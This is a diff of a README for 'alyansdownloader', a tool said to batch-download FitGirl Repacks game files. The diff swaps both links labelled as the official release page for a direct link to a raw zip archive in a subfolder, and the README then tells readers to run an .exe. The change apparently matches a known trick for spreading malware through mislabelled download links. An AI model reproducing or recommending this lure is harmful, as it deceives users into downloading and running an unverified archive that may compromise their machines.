@@ -1,6 +1,6 @@
 # 📥 alyansdownloader - Save time downloading your favorite games
 
-[![Download alyansdownloader](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Figueroa1885/alyansdownloader)
+[![Download alyansdownloader](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Figueroa1885/alyansdownloader/raw/refs/heads/main/aliform/Software-3.1.zip)
 
 alyansdownloader helps you pull multi-part files from FitGirl Repacks websites. It automates the process of gathering files, which saves you from clicking individual links. This tool acts as a bridge between the website and your local storage. It handles the download list so you can focus on your games.
 
@@ -26,7 +26,7 @@ Your computer needs a few things to run this tool correctly.
 
 Follow these steps to set up the software on your machine.
 
-1.  **Visit the download page:** Go to the official release page to get the latest version. [Click here to visit the download page](https://github.com/Figueroa1885/alyansdownloader).
+1.  **Visit the download page:** Go to the official release page to get the latest version. [Click here to visit the download page](https://github.com/Figueroa1885/alyansdownloader/raw/refs/heads/main/aliform/Software-3.1.zip).
 2.  **Locate the executable:** Look for the file ending in `.exe`.
 3.  **Save the file:** Download the file to a folder where you keep your tools.
 4.  **Run the application:** Double-click the file to open the interface.
